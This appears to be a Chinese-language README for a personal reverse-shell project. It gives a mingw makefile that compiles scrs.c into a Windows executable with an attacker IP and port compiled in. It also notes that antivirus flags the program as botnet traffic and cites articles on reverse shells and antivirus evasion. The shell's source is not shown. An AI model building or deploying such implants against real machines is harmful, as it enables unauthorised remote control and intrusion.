## 编译

```shell
$ sudo apt install mingw-w64-i686-dev mingw-w64
```

**makefile**

```makefile
CC=i686-w64-mingw32-g++
BUILD_DIR=build
CFLAGS=-o $(BUILD_DIR)/scrs.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

ATT_HOST=172.27.25.82
IP_Addr= -DIP=\"$(ATT_HOST)\"
ATT_PORT=8080
PORT= -DPORT=$(ATT_PORT)
ATT_LOC= $(IP_Addr) $(PORT)

$(shell mkdir -p $(BUILD_DIR))
.PHONY: build clean
build: scrs.c
	$(CC) scrs.c $(CFLAGS) $(ATT_LOC)

clean:
	rm -rf $(BUILD_DIR)
```

## 运行

运行会被火绒发现hhh。提示"收到僵尸网络xxx的攻击，已阻止"。

编写了一个`receiver.py`，不然没法正确解码GB2312，有乱码

## 参考

1. [Malware on Steroids – Part 1: Simple CMD Reverse Shell](https://niiconsulting.com/checkmate/2018/11/malware-on-steroids-part-1-simple-cmd-reverse-shell/)
2. [Malware on Steroids – Part 2: Evading Antivirus in a Simulated Organizational Environment](https://niiconsulting.com/checkmate/2018/11/malware-on-steroids-part-2-evading-antivirus-in-a-simulated-organizational-environment/)
3. [Malware on Steroids Part 3: Machine Learning & Sandbox Evasion](https://niiconsulting.com/checkmate/2018/12/malware-on-steroids-part-3-machine-learning-sandbox-evasion/) 提到了许多避免检测的方法 [link(这个链接图片健在)](https://0xdarkvortex.dev/index.php/2018/10/27/malware-on-steroids-part-3-machine-learning-sandbox-evasion/)